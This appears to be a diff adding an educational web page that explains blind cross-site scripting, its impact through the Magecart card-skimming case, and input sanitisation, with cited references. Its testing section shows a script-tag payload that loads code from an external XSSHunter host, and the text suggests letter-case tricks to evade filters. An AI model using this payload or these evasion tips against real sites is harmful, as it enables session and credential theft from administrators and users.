@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="main.css">
+    <script src="javascript.js"></script>
+    <title>Guide to Blind XSS</title>
+</head>
+
+<body>
+    <div class="container">s
+        <header>
+            <div class="forceheader">
+                <h1>Blind</h1>
+            </div>
+            <div class="forceheader">
+                <div class="hl">
+                    <h1>XSS</h1>
+                </div>
+            </div>
+            <div class="eyelogo">
+                <img src="icons\eye.svg">
+            </div>
+
+        </header>
+
+        <div class="title">
+            <h1>A Guide to Blind XSS</h1>
+        </div>
+
+        <button class="tab">Introduction to Injections and XSS</button>
+        <div class="content">
+            <div class="par">
+                <p>One of the many attacks prevalent <a class="supLink" href="#r1">[1]</a> across websites today is
+                    cross-site scripting
+                    (XSS), a type of injection attack that seeks to manipulate the end user's data.<a class="supLink"
+                        href="#r2">[2]</a>
+                <p>When we say injection, we are talking about code being sent to a web application that will execute on
+                    the
+                    victim's
+                    browser.<a class="supLink" href="#r3">[3]</a> This code takes advantage of HTML elements, URLs, and
+                    other areas of
+                    input that take unvalidated data.</p>
+                <p>XSS also comes in a variety of different types which produce different outcomes. For this topic, we
+                    will
+                    be focusing on
+                    Blind XSS.</p>
+            </div>
+        </div>
+
+        <button class="tab">What is Blind XSS?</button>
+        <div class="content">
+            <div class="par">
+                <p>Blind XSS is a type of 'stored' XSS attack, where the attacker's payload (code and data) is sent to
+                    the
+                    back end of a web application, i.e. the database system. <a class="supLink" href="#r4">[4]</a>
+                    Unlike
+                    'reflected'
+                    XSS attacks, the code in a stored XSS attack is permanently saved by the web server and can
+                    therefore be
+                    executed
+                    multiple times.</a></p>
+                <p>But in Blind XSS, the attacker does not see the outcome of their attack, as the payload is executed
+                    in a
+                    different
+                    application that they do not have access to. In practice, the code would normally execute when an
+                    administrator
+                    opens an admin panel on the back end. <a class="supLink" href="#r5">[5]</a></p>
+            </div>
+        </div>
+
+        <button class="tab">How does Blind XSS work?</button>
+        <div class="content">
+            <div class="par">
+                <p>For a Blind XSS attack to be performed, there needs to be an area of input - such as a form field or
+                    textbox - that will take
+                    unvalidated
+                    or unfiltered user data. This means that the field accepts an input of any format and will allow the
+                    attacker payload
+                    to be injected. This also applies to the back-end application, where inputs are not sanitised before
+                    being saved.</p>
+                <p>Next, the payload must be inserted into the input field. This would consist of a script tag along
+                    with
+                    the source of the script.
+                    However, we do need to consider how the input will be perceived by the interpreter - meaning we must
+                    format our payload in a specific
+                    way. For instance, we would close off any tags so that the script is being interpreted as HTML
+                    rather
+                    than plaintext. We also need
+                    to make assumptions about the way that the input may be filtered, such as blocking the word 'script'
+                    or
+                    'src'. We can try to overcome
+                    these blocks by changing the formatting of these words by writing 'SCRIPT' or 'sRc', for example.
+                    But
+                    this may take a few attempts,
+                    and we can only make a guess. Once we have constructed our payload, we can then submit it.</p>
+                <p>BUT - how do we know if it worked? This is where tools like XSSHunter come in. XSSHunter is used to
+                    screenshot pages where a vulnerability was found, i.e. where your script successfully executed. This
+                    means you will be able to see the page where your Blind XSS attack loaded even if it is in another
+                    application.</p>
+            </div>
+        </div>
+
+        <button class="tab">What is the Impact of Blind XSS?</button>
+        <div class="content">
+            <div class="par">
+                <p>The consequences of a Blind XSS attack could be severe. Imagine if an administrator tried to login to
+                    an application but was instead misdirected to a malicious website disguised as the target page -
+                    login details could be entered into a fake login form and stolen by the attacker. Or an attacker
+                    could steal sensitive data from a session cookie. No matter the situation, the user's data is at
+                    risk, and could even be used to carry out further attacks. With newly found administrative access,
+                    an attacker could seek out more sensitive data to steal or manipulate, bypassing exclusive access
+                    controls. Blind XSS is especially dangerous as it is harder to detect and can affect many users at
+                    once.</p>
+                <p>Many reports about the impact of Blind XSS have been produced. For example, in 2018, 380,000 British
+                    Airways customers had their personal details stolen in a Magecart attack. The attackers had injected
+                    a card-skimming script on the payments page that was able to gather debit/credit card information.
+                    <a class="supLink" href="#r6">[6]</a>Magecart is a common attack found targeting e-commerce sites,
+                    with stored and blind XSS attacks making up the majority of these attacks. <a class="supLink"
+                        href="#r7">[7]</a>
+                </p>
+                </p>
+            </div>
+        </div>
+
+        <button class="tab">How to Reduce the Impact?</button>
+        <div class="content">
+            <div class="par">
+                <p>Fortunately, there are many researched methods of reducing and eliminating the impact of Blind XSS
+                    attacks.</p>
+                <p>One of the most common and effective methods is to sanitise external input <a class="supLink"
+                        href="#r8">[8]</a>. This has shown to be
+                    effective in removing malicious scripts and unwanted inputs. To sanitise user inputs, you can use
+                    various libraries to remove malicious code, or you can force formatting requirements on the user.
+                </p>
+            </div>
+        </div>
+
+        <button class="tab">How to Test for Blind XSS?</button>
+        <div class="content">
+            <div class="par">
+                <div class="demoimgs"><img src="icons\blog.png"></div>
+
+                <p>We are able to test for Blind XSS vulnerabilities by injecting payloads anywhere our application
+                    retrieves user input. In this example, I have entered
+                    <textarea readonly><script src="https://js.rip/552m2ljnhs"></script></textarea>
+                    into an input form.
+                </p>
+                <div class="demoimgs"><img src="icons\inputform.png"></div>
+                <p>If successful, the script
+                    should load when the page is opened. In a Blind XSS attack, it would load in a separate
+                    area/application.
+                </p>
+                <p>Next, we enter any other needed information and submit the form.</p>
+                <div class="demoimgs"><img src="icons\postcomment.png"></div>
+                <p>BUT - how do we know if it worked?</p>
+                <div class="demoimgs"><img src="icons\xsshunter.png"></div>
+                <p>This is where tools like XSSHunter <a class="supLink"
+                    href="#r9">[9]</a> come in. XSSHunter is used to screenshot pages where a
+                    vulnerability was found, i.e. where your script successfully executed. This means you will be able
+                    to see the page where your Blind XSS attack loaded even if it is in another application.</p>
+                <div class="demoimgs"><img src="icons\xssreport.png"></div>
+                <p>Here, you can see that it has taken a screenshot of the vulnerable page. We can also see extra
+                    information in our XSSHunter profile if we wish to understand the source of the attack.</p>
+            </div>
+        </div>
+
+        <footer>
+            <h1>References</h1>
+            <p id="r1">[1] "OWASP Top 10 | OWASP Foundation". Available at: https://owasp.org/www-project-top-ten/
+                (Accessed:
+                28/04/2024)</p>
+            <p id="r2">[2] S, Kirsten. (No date) "Cross Site Scripting (XSS) | OWASP Foundation". Available at:
+                https://owasp.org/www-community/attacks/xss/ (Accessed: 28/04/2024)</p>
+            <p id="r3">[3] "Injection Attacks | IBM Documentation" (2021). Available at:
+                https://www.ibm.com/docs/en/snips/4.6.0?topic=categories-injection-attacks (Accessed: 28/04/2024)</p>
+            <p id="r4">[4] Loi Liang Yang (2023) "Cross Site Scripting (XSS) tutorial for Beginners". 21 October.
+                Available
+                at: https://www.youtube.com/watch?v=bCP8_WYsvP4 (Accessed: 28/04/2024)</p>
+            <p id="r5">[5] "Testing for blind XSS - PortSwigger" (2024). Available at:
+                https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-blind-xss
+                (Accessed: 28/04/2024)</p>
+            <p id="r6">[6] Corfield, G. (2020) "British Airways fined £20m for Magecart hack that exposed 400k folks'
+                credit card details to crooks". Available at:
+                https://www.theregister.com/2020/10/16/british_airways_ico_fine_20m/ (Accessed: 02/05/2024)</p>
+            <p id="r7">[7] Sansec Forensics Team (2024). "What is Magecart?"" Available at:
+                https://sansec.io/what-is-magecart#magecart-history (Accessed: 02/05/2024)</p>
+            <p id="r8">[8] Iannone, E. et al. (2023) “The Secret Life of Software Vulnerabilities: A Large-Scale
+                Empirical Study,” IEEE Transactions on Software Engineering, 49(1). Available at:
+                https://doi.org/10.1109/TSE.2022.3140868.</p>
+            <p id="r9">[9] Hammond, A. (2021) “Hacker Tools: How to set up XSSHunter”. Available at:
+                https://blog.intigriti.com/2021/08/18/hacker-tools-xsshunter/ (Accessed: 02/05/2024)</p>
+            <h1>Credits</h1>
+            <p>Eye logo: UXWing at - https://uxwing.com/eye-blind-icon/ </p>
+        </footer>
+    </div>
+
+
+    <script src="javascript.js"></script>
+</body>
+
+</html>
